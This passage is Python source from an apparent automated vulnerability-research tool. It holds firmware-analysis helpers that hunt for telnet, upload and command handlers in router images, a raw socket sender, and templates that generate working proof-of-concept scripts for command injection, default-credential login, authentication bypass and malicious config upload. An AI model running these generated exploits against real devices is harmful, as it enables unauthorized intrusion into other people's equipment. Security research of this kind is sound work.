    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.fuzzing.manager import FuzzingManager, FuzzingTarget
        fm = FuzzingManager(sandbox=_sandbox, timeout=timeout)
        target = FuzzingTarget(host=host, port=port, protocol=protocol)
        if not fm.can_fuzz(target):
            return ToolResult(tool_name="fuzz_target", command=[host, str(port)],
                              stdout=f"Fuzzing not available. AFL: {fm.afl_available}, Boofuzz: {fm.boofuzz_available}",
                              return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
        status = fm.status()
        lines = [f"Fuzzing {host}:{port} ({protocol}) for {timeout}s",
                 f"AFL available: {status['afl']}", f"Boofuzz available: {status['boofuzz']}"]
        return ToolResult(tool_name="fuzz_target", command=[host, str(port)],
                          stdout="\n".join(lines), return_code=0,
                          duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="fuzz_target", command=[host, str(port)], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


# ── Browser tool wrappers ──

def _browser_navigate(url: str, cookies: str = "", wait_seconds: int = 3) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.browser_tools import browser_navigate
        stdout = browser_navigate(url, cookies=cookies, wait_seconds=wait_seconds)
        return ToolResult(tool_name="browser_navigate", command=[url], stdout=stdout,
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="browser_navigate", command=[url], stdout="",
                          stderr=f"Browser navigation failed: {e}. Ensure Playwright MCP is available.",
                          return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _browser_extract(what: str = "all") -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.browser_tools import browser_extract
        stdout = browser_extract(what=what)
        return ToolResult(tool_name="browser_extract", command=[what], stdout=stdout[:8000],
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="browser_extract", command=[what], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _browser_click(selector_or_text: str) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.browser_tools import browser_click
        stdout = browser_click(selector_or_text)
        return ToolResult(tool_name="browser_click", command=[selector_or_text], stdout=stdout,
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="browser_click", command=[selector_or_text], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _tool_result(
    tool_name: str,
    command: str | list[str],
    stdout: str,
    *,
    stderr: str = "",
    return_code: int = 0,
    start: float | None = None,
) -> "ToolResult":
    from vulnagent.tools.executor import ToolResult

    return ToolResult(
        tool_name=tool_name,
        command=command,
        return_code=return_code,
        stdout=stdout,
        stderr=stderr,
        duration_ms=((time.perf_counter() - start) * 1000) if start is not None else 0.0,
    )


def _describe_blob(blob: bytes) -> str:
    if not blob:
        return "empty file"
    printable = sum(1 for byte in blob[:4096] if 32 <= byte <= 126 or byte in (9, 10, 13))
    ratio = printable / max(1, min(len(blob), 4096))
    if ratio > 0.9:
        return "ASCII text data"
    if blob.startswith(b"PK\x03\x04"):
        return "ZIP archive data"
    if blob.startswith(b"\x1f\x8b\x08"):
        return "gzip compressed data"
    return "binary data"


def _parse_elf_header(blob: bytes) -> dict[str, object] | None:
    if len(blob) < 64 or not blob.startswith(b"\x7fELF"):
        return None

    elf_class = blob[4]
    data_encoding = blob[5]
    if elf_class not in (1, 2) or data_encoding not in (1, 2):
        return None

    endian = "<" if data_encoding == 1 else ">"
    header_fmt = endian + ("HHIIIIIHHHHHH" if elf_class == 1 else "HHIQQQIHHHHHH")
    header_size = struct.calcsize(header_fmt)
    if len(blob) < 16 + header_size:
        return None

    unpacked = struct.unpack(header_fmt, blob[16 : 16 + header_size])
    e_type, e_machine, _version = unpacked[:3]
    entry = unpacked[3]
    program_header_offset = unpacked[4]
    section_header_offset = unpacked[5]

    return {
        "class": "ELF32" if elf_class == 1 else "ELF64",
        "endianness": "2's complement, little endian" if data_encoding == 1 else "2's complement, big endian",
        "type": _elf_type_name(e_type),
        "machine": _elf_machine_name(e_machine),
        "entry": entry,
        "program_header_offset": program_header_offset,
        "section_header_offset": section_header_offset,
    }


def _elf_type_name(value: int) -> str:
    return {
        0: "NONE (Unknown file type)",
        1: "REL (Relocatable file)",
        2: "EXEC (Executable file)",
        3: "DYN (Shared object file)",
        4: "CORE (Core file)",
    }.get(value, f"0x{value:x}")


def _elf_machine_name(value: int) -> str:
    return {
        3: "Intel 80386",
        8: "MIPS",
        40: "ARM",
        62: "x86-64",
        183: "AArch64",
    }.get(value, f"machine-{value}")


def _scan_firmware_signatures(blob: bytes, max_hits: int = 32) -> list[tuple[int, str]]:
    signatures = [
        (b"\x27\x05\x19\x56", "uImage header"),
        (b"HDR0", "Broadcom TRX firmware header"),
        (b"hsqs", "SquashFS filesystem"),
        (b"sqsh", "SquashFS filesystem"),
        (b"UBI#", "UBI erase count header"),
        (b"\x85\x19", "JFFS2 filesystem marker"),
        (b"\x1f\x8b\x08", "gzip compressed data"),
        (b"PK\x03\x04", "ZIP local file header"),
        (b"\xfd7zXZ\x00", "XZ compressed data"),
        (b"070701", "cpio newc archive"),
        (b"070702", "cpio crc archive"),
    ]
    hits: list[tuple[int, str]] = []
    for signature, description in signatures:
        start = 0
        while len(hits) < max_hits:
            offset = blob.find(signature, start)
            if offset < 0:
                break
            hits.append((offset, description))
            start = offset + 1
    hits.sort(key=lambda item: item[0])
    return hits[:max_hits]


def _find_squashfs_offsets(blob: bytes, max_candidates: int = 8) -> list[int]:
    offsets: list[int] = []
    for offset, description in _scan_firmware_signatures(blob, max_hits=max_candidates * 4):
        if description != "SquashFS filesystem":
            continue
        if offset not in offsets:
            offsets.append(offset)
        if len(offsets) >= max_candidates:
            break
    return offsets


def _load_squashfs_class():
    try:
        from dissect.squashfs import SquashFS
    except Exception:
        return None
    return SquashFS


def _load_first_squashfs(path: str) -> tuple[object | None, int | None, str]:
    blob = Path(path).read_bytes()
    offsets = _find_squashfs_offsets(blob)
    if not offsets:
        return None, None, ""

    squashfs_cls = _load_squashfs_class()
    if squashfs_cls is None:
        return None, None, "SquashFS markers detected but optional dependency 'dissect.squashfs' is unavailable."

    errors: list[str] = []
    for offset in offsets:
        try:
            return squashfs_cls(io.BytesIO(blob[offset:])), offset, ""
        except Exception as exc:
            errors.append(f"0x{offset:08x}: {exc}")
    return None, None, "\n".join(errors[:4])


def _summarize_squashfs_filesystem(fs: object, offset: int) -> str:
    lines = [f"SQUASHFS_FOUND offset=0x{offset:08x}"]

    root = _squashfs_get(fs, "/")
    if root is not None and hasattr(root, "iterdir"):
        try:
            root_entries = sorted(
                (f"/{entry.name}" for entry in root.iterdir() if getattr(entry, "name", "")),
                key=str.lower,
            )
        except Exception:
            root_entries = []
        for entry in root_entries[:24]:
            lines.append(f"ROOT_DIR: {entry}")

    interesting_paths = [
        "/bin/goahead",
        "/bin/login",
        "/bin/miniupnpd",
        "/etc_ro/rcS",
        "/etc_ro/inittab",
        "/etc_ro/web/d_telnet.asp",
        "/etc_ro/web/dir_login.asp",
        "/etc_ro/web/cgi-bin/ExportSettings.sh",
        "/etc_ro/web/cgi-bin/history.sh",
        "/etc_ro/web/cgi-bin/reboot.sh",
        "/etc_ro/web/cgi-bin/upload.cgi",
        "/etc_ro/web/cgi-bin/upload_bootloader.cgi",
        "/etc_ro/web/cgi-bin/upload_settings.cgi",
        "/etc_ro/web/cgi-bin/upload_torrent.cgi",
        "/sbin/chpasswd.sh",
        "/usr/sbin/chpasswd",
        "/usr/sbin/telnetd",
    ]
    for path in interesting_paths:
        if _squashfs_get(fs, path) is not None:
            lines.append(f"INTERESTING_PATH: {path}")

    text_markers = {
        "/etc_ro/rcS": ["telnetd", "goahead", "miniupnpd"],
        "/etc_ro/inittab": ["::sysinit:/etc_ro/rcS", "ttyS1::respawn:/bin/sh"],
        "/etc_ro/web/d_telnet.asp": ["form2Telnet.cgi"],
        "/etc_ro/web/dir_login.asp": ["goform/formLogin"],
        "/sbin/chpasswd.sh": ["chpasswd", "/tmp/tmpchpw"],
    }
    for path, markers in text_markers.items():
        text = _read_squashfs_text(fs, path)
        if not text:
            continue
        for hit in _extract_marker_hits(text, markers):
            lines.append(f"TEXT_HIT: {path} :: {hit}")

    binary_markers = {
        "/bin/goahead": [
            "showSystemCommandASP",
            "SystemCommand",
            "repeatLastSystemCommand",
            "doSystem",
            "doSystembk",
            "upload.cgi",
            "upload_settings.cgi",
            "upload_torrent.cgi",
            "upload_bootloader.cgi",
            "form2Telnet.cgi",
            "d_telnet.asp",
            "dir_login.asp",
            "telnetd",
            "goform/formLogin",
        ],
    }
    for path, markers in binary_markers.items():
        strings_blob = "\n".join(_read_squashfs_strings(fs, path))
        if not strings_blob:
            continue
        for marker in markers:
            if marker in strings_blob:
                lines.append(f"BINARY_STRING: {path} :: {marker}")

    return "\n".join(dict.fromkeys(lines))


def _squashfs_get(fs: object, path: str):
    """Get a SquashFS node, trying both /path and path forms."""
    try:
        node = fs.get(path)
        if node is not None:
            return node
    except Exception:
        pass
    # Try without leading "/" — some SquashFS images store paths that way
    if path.startswith("/"):
        try:
            return fs.get(path[1:])
        except Exception:
            return None
    return None


def _iter_squashfs_file_paths(fs: object, max_nodes: int = 4096) -> list[str]:
    root = _squashfs_get(fs, "/")
    if root is None:
        return []

    results: list[str] = []
    stack: list[tuple[str, object]] = [("/", root)]
    seen: set[str] = set()
    while stack and len(seen) < max_nodes:
        current_path, node = stack.pop()
        if current_path in seen:
            continue
        seen.add(current_path)

        is_dir = getattr(node, "is_dir", lambda: False)
        if callable(is_dir) and is_dir():
            try:
                children = sorted(
                    list(node.iterdir()),
                    key=lambda entry: str(getattr(entry, "name", "")).lower(),
                    reverse=True,
                )
            except Exception:
                children = []
            for child in children:
                name = str(getattr(child, "name", "")).strip()
                if not name:
                    continue
                child_path = f"/{name}" if current_path == "/" else f"{current_path}/{name}"
                stack.append((child_path, child))
            continue

        is_file = getattr(node, "is_file", lambda: False)
        if callable(is_file) and is_file():
            results.append(current_path)

    return results


def _is_web_text_candidate(path: str, blob: bytes) -> bool:
    lowered = path.lower()
    if lowered.endswith((".asp", ".htm", ".html", ".js", ".xml", ".txt", ".sh")):
        return True
    if lowered.startswith("/etc_ro/web/") and not _looks_binary_blob(blob):
        return True
    return False


def _is_route_binary_candidate(path: str, blob: bytes) -> bool:
    lowered = path.lower()
    if lowered in {"/bin/goahead", "/usr/bin/goahead", "/sbin/goahead"}:
        return True
    if lowered.endswith(".cgi"):
        return True
    return _looks_binary_blob(blob) and lowered.startswith(("/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"))


def _read_squashfs_text(fs: object, path: str, max_bytes: int = 4096) -> str:
    data = _read_squashfs_bytes(fs, path, max_bytes=max_bytes)
    return _decode_blob_text(data)


def _read_squashfs_strings(fs: object, path: str, max_bytes: int = 512 * 1024) -> list[str]:
    data = _read_squashfs_bytes(fs, path, max_bytes=max_bytes)
    return _extract_printable_strings(data)


def _read_squashfs_bytes(fs: object, path: str, max_bytes: int = 4096) -> bytes:
    node = _squashfs_get(fs, path)
    if node is None or not getattr(node, "is_file", lambda: False)():
        return b""
    try:
        data = node.open().read(max_bytes)
    except TypeError:
        data = node.open().read()
    except Exception:
        return b""
    if isinstance(data, str):
        return data.encode("utf-8", errors="replace")
    return bytes(data[:max_bytes])


def _search_blob_for_pattern(data: bytes, pattern: str, mode: str) -> tuple[str, list[str]]:
    normalized_mode = mode if mode in {"text", "strings"} else "auto"
    if normalized_mode == "text":
        return "text", _match_text_lines(_decode_blob_text(data), pattern)
    if normalized_mode == "strings":
        return "strings", _match_string_values(_extract_printable_strings(data), pattern)
    if _looks_binary_blob(data):
        return "strings", _match_string_values(_extract_printable_strings(data), pattern)
    return "text", _match_text_lines(_decode_blob_text(data), pattern)


def _extract_web_routes_from_text(text: str) -> list[str]:
    if not text:
        return []
    routes: list[str] = []
    patterns = [
        r"""(?:action|href|src)\s*=\s*["']([^"']+)["']""",
        r"""((?:/cgi-bin/|/goform/|goform/)[A-Za-z0-9_./-]+)""",
    ]
    for pattern in patterns:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            route = str(match.group(1)).strip()
            if _is_interesting_web_route(route) and route not in routes:
                routes.append(route)
    return routes[:64]


def _extract_web_routes_from_strings(strings: list[str]) -> list[str]:
    routes: list[str] = []
    for value in strings:
        for match in re.finditer(r"""((?:/cgi-bin/|/goform/|goform/)[A-Za-z0-9_./-]+)""", value, re.IGNORECASE):
            route = str(match.group(1)).strip()
            if _is_interesting_web_route(route) and route not in routes:
                routes.append(route)
    return routes[:64]


def _extract_handler_markers(strings: list[str]) -> list[str]:
    markers: list[str] = []
    known = {
        "showSystemCommandASP",
        "SystemCommand",
        "repeatLastSystemCommand",
        "doSystem",
        "doSystembk",
        "websFormDefine",
        "formDefine",
    }
    for value in strings:
        stripped = str(value).strip()
        if stripped in known and stripped not in markers:
            markers.append(stripped)
    return markers[:32]


def _is_interesting_web_route(route: str) -> bool:
    normalized = str(route).strip()
    if not normalized:
        return False
    if normalized.startswith(("javascript:", "#", "http://", "https://")):
        return False
    return (
        normalized.startswith(("/cgi-bin/", "/goform/", "goform/"))
        or normalized.endswith((".cgi", ".asp", ".htm", ".html"))
    )


def _is_priority_web_route(source_path: str, route: str) -> bool:
    combined = f"{source_path} {route}".lower()
    keywords = (
        "upload",
        "saveconf",
        "export",
        "import",
        "login",
        "telnet",
        "system",
        "command",
        "reboot",
        "passwd",
        "password",
        "config",
    )
    return any(keyword in combined for keyword in keywords)


def _match_text_lines(text: str, pattern: str, limit: int = 3) -> list[str]:
    if not text:
        return []
    lowered_pattern = pattern.lower()
    hits: list[str] = []
    for line in text.splitlines():
        stripped = line.strip()
        if stripped and lowered_pattern in stripped.lower() and stripped not in hits:
            hits.append(stripped[:240])
        if len(hits) >= limit:
            break
    return hits


def _match_string_values(strings: list[str], pattern: str, limit: int = 3) -> list[str]:
    lowered_pattern = pattern.lower()
    hits: list[str] = []
    for value in strings:
        normalized = str(value).strip()
        if normalized and lowered_pattern in normalized.lower() and normalized not in hits:
            hits.append(normalized[:240])
        if len(hits) >= limit:
            break
    return hits


def _decode_blob_text(data: bytes) -> str:
    if not data:
        return ""
    return bytes(data).decode("utf-8", errors="replace")


def _extract_printable_strings(data: bytes, limit: int = 4000) -> list[str]:
    if not data:
        return []
    matches = re.findall(rb"[\x20-\x7e]{4,}", bytes(data))
    return list(dict.fromkeys(match.decode("ascii", errors="ignore") for match in matches[:limit]))


def _looks_binary_blob(data: bytes) -> bool:
    if not data:
        return False
    if data.startswith(b"\x7fELF"):
        return True
    nul_ratio = data[:4096].count(0) / max(1, min(len(data), 4096))
    if nul_ratio > 0.05:
        return True
    printable = sum(1 for byte in data[:4096] if 32 <= byte <= 126 or byte in (9, 10, 13))
    ratio = printable / max(1, min(len(data), 4096))
    return ratio < 0.75


def _extract_marker_hits(text: str, markers: list[str]) -> list[str]:
    hits: list[str] = []
    for marker in markers:
        matched_line = ""
        for line in text.splitlines():
            if marker in line:
                matched_line = line.strip()
                break
        candidate = matched_line or marker
        if candidate and candidate not in hits:
            hits.append(candidate)
    return hits


def _netcat_connect(params: dict) -> "ToolResult":
    import socket
    import time

    from vulnagent.tools.executor import ToolResult

    host = str(params["host"])
    port = int(params["port"])
    payload = str(params.get("payload", ""))
    timeout = int(params.get("timeout", 5))
    read_bytes = int(params.get("read_bytes", 4096))
    start = time.perf_counter()

    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            if payload:
                sock.sendall(payload.encode("utf-8", errors="replace"))

            chunks: list[bytes] = []
            bytes_remaining = read_bytes
            while bytes_remaining > 0:
                try:
                    chunk = sock.recv(min(1024, bytes_remaining))
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                bytes_remaining -= len(chunk)

        stdout = b"".join(chunks).decode("utf-8", errors="replace")
        return ToolResult(
            tool_name="netcat_connect",
            command=f"socket://{host}:{port}",
            return_code=0,
            stdout=stdout,
            stderr="",
            duration_ms=(time.perf_counter() - start) * 1000,
            timed_out=False,
        )
    except Exception as exc:
        return ToolResult(
            tool_name="netcat_connect",
            command=f"socket://{host}:{port}",
            return_code=-1,
            stdout="",
            stderr=str(exc),
            duration_ms=(time.perf_counter() - start) * 1000,
            timed_out=isinstance(exc, socket.timeout),
        )


def _runtime_workspace_manager() -> RuntimeWorkspaceManager:
    try:
        settings = SettingsManager().load()
        configured = str(settings.get("runtime.run_root", "") or "").strip()
        if configured:
            return RuntimeWorkspaceManager(configured)
    except Exception:
        pass
    return RuntimeWorkspaceManager(default_run_root())


def _runtime_workspace_for_artifact(artifact_path: str | Path):
    manager = _runtime_workspace_manager()
    run_id = current_runtime_run_id()
    if run_id:
        return manager.create_for_artifact(artifact_path, run_id=run_id)
    return manager.create_for_artifact(artifact_path)


def _resolve_execution_backend() -> tuple[str, str, object | None]:
    """Return (requested_backend, actual_backend, remote_executor_or_none)."""
    try:
        settings = SettingsManager().load()
        requested = str(settings.get("runtime.execution_backend", "local") or "local").strip().lower()
        if requested not in {"local", "ubuntu_ssh"}:
            requested = "local"
        remote_config = RemoteConfig.from_settings(settings.all())
        configure_remote(remote_config)
        if requested == "ubuntu_ssh" and remote_config.is_ready():
            from vulnagent.tools.ssh_executor import get_remote_executor
            return requested, "ubuntu_ssh", get_remote_executor()
        return requested, "local", None
    except Exception:
        return "local", "local", None


def _probe_endpoint(scheme: str, port: int, host: str = "127.0.0.1") -> str:
    normalized = (scheme or "tcp").strip().lower() or "tcp"
    if normalized in {"http", "https"}:
        return f"{normalized}://{host}:{port}/"
    return f"{normalized}://{host}:{port}"


# ── PoC Generator ────────────────────────────────────────────────────────

_POC_TEMPLATES: dict[str, str] = {
    "command_injection": '''#!/usr/bin/env python3
"""{title}

Proof-of-Concept - Command Injection
CWE-78: OS Command Injection

WARNING: This is a STATIC-ANALYSIS PoC. No dynamic verification was performed.
Target endpoint was identified via firmware binary/strings analysis only.
"""

import sys
import urllib.request
import urllib.error

TARGET = "{endpoint}"
PAYLOAD = "{payload}"


def send_payload(url: str, payload: str) -> str | None:
    data = payload.encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        method="POST",
        headers={{"Content-Type": "application/x-www-form-urlencoded"}},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return f"HTTP {exc.code}: {exc.reason}"
    except OSError as exc:
        return f"Connection error: {exc}"


def main() -> int:
    if not TARGET.startswith("http"):
        print("[UNVERIFIED] No live endpoint - static analysis only.")
        print(f"Endpoint identified from firmware: {TARGET}")
        print(f"Payload to test: {PAYLOAD}")
        print("To verify: deploy this firmware on real hardware or QEMU emulation.")
        return 0

    print(f"[*] Target: {TARGET}")
    print(f"[*] Payload: {PAYLOAD}")
    response = send_payload(TARGET, PAYLOAD)
    if response is None:
        print("[-] No response received.")
        return 1

    print(f"[+] Response ({len(response)} bytes):")
    print(response[:2000])
    if "Connection error" not in response and "HTTP 4" not in response:
        print("[+] Vulnerability confirmed - command execution possible.")
        return 0
    print("[-] Exploit may need adjustment - check payload encoding.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
''',

    "hardcoded_credentials": '''#!/usr/bin/env python3
"""{title}

Proof-of-Concept - Hardcoded / Default Credentials
CWE-798: Use of Hard-coded Credentials

WARNING: This is a STATIC-ANALYSIS PoC. No dynamic verification was performed.
Credentials were found via firmware binary/strings/config analysis only.
"""

import sys
import urllib.request
import urllib.error
import base64

TARGET = "{endpoint}"
PAYLOAD = "{payload}"


def try_login(url: str, credentials: str) -> dict[str, str] | None:
    user_pass = credentials.split(":", 1)
    if len(user_pass) != 2:
        user, password = "admin", credentials
    else:
        user, password = user_pass[0], user_pass[1]

    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        url,
        method="GET",
        headers={{"Authorization": f"Basic {auth}"}},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return {{
                "status": resp.status,
                "body": resp.read().decode("utf-8", errors="replace")[:2000],
            }}
    except urllib.error.HTTPError as exc:
        return {{
            "status": exc.code,
            "body": f"HTTP {exc.code}: {exc.reason}",
        }}
    except OSError as exc:
        return {{"status": 0, "body": f"Connection error: {exc}"}}

    return None


def main() -> int:
    if not TARGET.startswith("http"):
        print("[UNVERIFIED] No live endpoint - static analysis only.")
        print(f"Credentials found in firmware: {PAYLOAD}")
        print(f"Component: {TARGET}")
        print("To verify: deploy firmware, attempt login with these credentials.")
        return 0

    print(f"[*] Target: {TARGET}")
    print(f"[*] Trying credentials: {PAYLOAD}")
    result = try_login(TARGET, PAYLOAD)
    if result is None:
        print("[-] No response received.")
        return 1
    status = result.get("status", 0)
    body = result.get("body", "")
    if status == 200:
        print(f"[!] LOGIN SUCCESSFUL (HTTP {status})")
        return 0
    if status == 401:
        print("[-] Access denied (HTTP 401)")
        return 1
    print(f"[*] HTTP {status}")
    print(body[:1000])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
''',

    "auth_bypass": '''#!/usr/bin/env python3
"""{title}

Proof-of-Concept - Authentication Bypass
CWE-306: Missing Authentication for Critical Function

WARNING: This is a STATIC-ANALYSIS PoC. No dynamic verification was performed.
"""

import sys
import urllib.request
import urllib.error

TARGET = "{endpoint}"
PAYLOAD = "{payload}"


def send_unauthenticated(url: str, payload: str = "") -> str | None:
    method = "GET"
    data = None
    if payload:
        method = "POST"
        data = payload.encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return (
                f"HTTP {resp.status} {resp.reason}\\n"
                f"Headers: {dict(resp.headers)}\\n"
                f"Body: {resp.read().decode('utf-8', errors='replace')[:1500]}"
            )
    except urllib.error.HTTPError as exc:
        return f"HTTP {exc.code}: {exc.reason}"
    except OSError as exc:
        return f"Connection error: {exc}"


def main() -> int:
    if not TARGET.startswith("http"):
        print("[UNVERIFIED] No live endpoint - static analysis only.")
        print(f"Endpoint identified: {TARGET}")
        print("To verify: send unauthenticated request to this endpoint on a live device.")
        return 0

    print(f"[*] Target: {TARGET}")
    print("[*] Sending unauthenticated request...")
    response = send_unauthenticated(TARGET, PAYLOAD)
    if response is None:
        print("[-] No response received.")
        return 1
    if response.startswith("HTTP 2"):
        print(f"[!] AUTH BYPASS CONFIRMED:")
        print(response[:2000])
        return 0
    if response.startswith("HTTP 401") or response.startswith("HTTP 403"):
        print(f"[-] Access properly denied: {response[:200]}")
        return 1
    print(f"[*] Response: {response[:2000]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
''',

    "config_import": '''#!/usr/bin/env python3
"""{title}

Proof-of-Concept - Insecure Configuration Import
CWE-15: External Control of System or Configuration Setting

WARNING: This is a STATIC-ANALYSIS PoC. No dynamic verification was performed.
"""

import sys
import os
import tempfile
import urllib.request
import urllib.error

TARGET = "{endpoint}"
PAYLOAD = "{payload}"


def create_malicious_config() -> str:
    config_content = "Login=attacker\\nPassword=evilpass123\\n"
    if PAYLOAD:
        config_content = PAYLOAD.replace("\\n", "\\n")
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".cfg", delete=False, encoding="utf-8")
    tmp.write(config_content)
    tmp.close()
    return tmp.name


def upload_config(url: str, filepath: str) -> str | None:
    boundary = "----PoCUploadBoundary"
    with open(filepath, "rb") as fh:
        file_data = fh.read()
    body = (
        f"--{boundary}\\r\\n"
        f'Content-Disposition: form-data; name="file"; '
        f'filename="{os.path.basename(filepath)}"\\r\\n'
        f"Content-Type: application/octet-stream\\r\\n\\r\\n"
    ).encode() + file_data + f"\\r\\n--{boundary}--\\r\\n".encode()
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={{"Content-Type": f"multipart/form-data; boundary={boundary}"}},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return f"HTTP {resp.status} {resp.reason}\\n{resp.read().decode('utf-8', errors='replace')[:1500]}"
    except urllib.error.HTTPError as exc:
        return f"HTTP {exc.code}: {exc.reason}"
    except OSError as exc:
        return f"Connection error: {exc}"


def main() -> int:
    if not TARGET.startswith("http"):
        print("[UNVERIFIED] No live endpoint - static analysis only.")
        print(f"Config import endpoint: {TARGET}")
        print("To verify: upload a crafted config to a live device and check if accepted.")
        return 0

    print(f"[*] Target: {TARGET}")
    print("[*] Creating malicious configuration file...")
    config_path = create_malicious_config()
    print(f"[+] Config written to: {config_path}")
    print("[*] Uploading malicious configuration...")
    response = upload_config(TARGET, config_path)
    os.unlink(config_path)
    if response is None:
        print("[-] No response received.")
        return 1
    if response.startswith("HTTP 2"):
        print("[!] UPLOAD ACCEPTED")
        print(response[:2000])
        return 0
    print(f"[-] Upload rejected: {response[:500]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
''',

    "generic": '''#!/usr/bin/env python3
"""{title}

Proof-of-Concept - {vuln_type}
Target: {endpoint}

WARNING: This is a STATIC-ANALYSIS PoC. No dynamic verification was performed.
Run this script against a live device to confirm the finding.
"""

import sys
import json
import urllib.request
import urllib.error

TARGET = "{endpoint}"
PAYLOAD = {payload!r}
EXTRA_PARAMS = {extra_params_json}


def send_request(url: str) -> str | None:
    method = EXTRA_PARAMS.get("method", "GET")
    headers = dict(EXTRA_PARAMS.get("headers", {{}}))
    data = None
    if PAYLOAD:
        data = str(PAYLOAD).encode("utf-8")
    if method == "POST" and not data and EXTRA_PARAMS.get("form"):
        from urllib.parse import urlencode
        data = urlencode(EXTRA_PARAMS["form"]).encode()
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return (
                f"HTTP {resp.status} {resp.reason}\\n"
                f"Body: {resp.read().decode('utf-8', errors='replace')[:2000]}"
            )
    except urllib.error.HTTPError as exc:
        return f"HTTP {exc.code}: {exc.reason}"
    except OSError as exc:
        return f"Connection error: {exc}"


def main() -> int:
    if not TARGET.startswith("http"):
        print("[UNVERIFIED] No live endpoint - static analysis only.")
        print(f"Finding: {TARGET}")
        print("To verify: run this script against a live device at the identified endpoint.")
        return 0

    print(f"[*] Target: {TARGET}")
    response = send_request(TARGET)
    if response is None:
        print("[-] No response received.")
        return 1
    print(response[:2000])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
''',
}


def _generate_poc(
    vuln_type: str,
    target_endpoint: str,
    vuln_title: str,
    payload: str = "",
    extra_params: str = "{}",
) -> "ToolResult":
    """Generate a standalone PoC Python script for a firmware vulnerability."""
    import json as _json

    start = time.perf_counter()
    normalized_type = (vuln_type or "generic").strip().lower()
    normalized_title = (vuln_title or "Firmware Vulnerability PoC").strip()

    if normalized_type in {"cmd_injection", "command_injection", "rce", "os_command_injection"}:
        normalized_type = "command_injection"
    elif normalized_type in {"hardcoded", "default_creds", "default_credentials", "hardcoded_credentials", "creds"}:
        normalized_type = "hardcoded_credentials"
    elif normalized_type in {"auth_bypass", "missing_auth", "unauth", "unauthenticated_access"}:
        normalized_type = "auth_bypass"
    elif normalized_type in {"config_import", "insecure_config", "malicious_config", "config_injection"}:
        normalized_type = "config_import"

    template = _POC_TEMPLATES.get(normalized_type, _POC_TEMPLATES["generic"])

    try:
        extra = _json.loads(extra_params) if extra_params else {}
    except Exception:
        extra = {}

    # Detect whether we have a live service endpoint or just a static file path
    is_live = target_endpoint.startswith("http://") or target_endpoint.startswith("https://")
    is_file = any(target_endpoint.lower().endswith(s) for s in (".bin", ".img", ".zip", ".fw", ".trx"))
    is_unverified = not is_live

    script = template.replace("{title}", normalized_title)
    script = script.replace("{endpoint}", target_endpoint)
    script = script.replace("{payload}", payload)
    script = script.replace("{vuln_type}", normalized_type.replace("_", " ").title())
    script = script.replace("{extra_params_json}", _json.dumps(extra, indent=4))

    safe_title = "".join(c if c.isalnum() or c in "._-" else "_" for c in normalized_title)[:60]
    workspace = _runtime_workspace_for_artifact("poc_workspace")
    poc_dir = workspace.root / "poc"
    poc_dir.mkdir(parents=True, exist_ok=True)
    poc_path = poc_dir / f"poc_{safe_title}_{normalized_type}.py"
    poc_path.write_text(script, encoding="utf-8")

    verification_status = "UNVERIFIED_STATIC_ONLY" if is_unverified else "LIVE_ENDPOINT"
    stdout = (
        f"VERIFICATION_STATUS: {verification_status}\n"
        f"POC_SCRIPT_PATH: {poc_path}\n"
        f"POC_VULN_TYPE: {normalized_type}\n"
        f"POC_TITLE: {normalized_title}\n"
        f"POC_TARGET: {target_endpoint}\n"
        f"POC_USAGE:\n"
        f"  python {poc_path.name}\n"
    )
    if is_unverified:
        stdout += (
            "\n[STATIC-ONLY] This PoC was generated from static firmware analysis.\n"
            "No live service was probed. Deploy the firmware on real hardware or\n"
            "QEMU emulation, then re-run to confirm the finding.\n"
        )
    stdout += f"---SCRIPT_BEGIN---\n{script}\n---SCRIPT_END---"
    return _tool_result("generate_poc", [normalized_type, target_endpoint], stdout, start=start)
